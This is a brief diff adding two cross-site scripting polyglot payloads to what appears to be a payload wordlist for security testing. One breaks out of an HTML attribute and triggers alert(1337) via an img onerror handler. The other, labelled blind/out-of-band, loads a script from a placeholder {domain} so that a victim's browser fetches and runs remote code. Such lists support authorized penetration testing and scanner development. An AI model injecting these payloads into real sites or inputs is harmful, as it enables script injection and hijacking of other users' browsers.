@@ -1,0 +1,4 @@
+##POLYGLOT - XSS Cross-Context (Math)##
+'"><img src=x onerror=alert(1337)><!--
+##POLYGLOT - XSS Blind/OOB##
+'"><script src=//{domain}/x.js></script><img src=//{domain}/x onerror=alert(1337)><!--
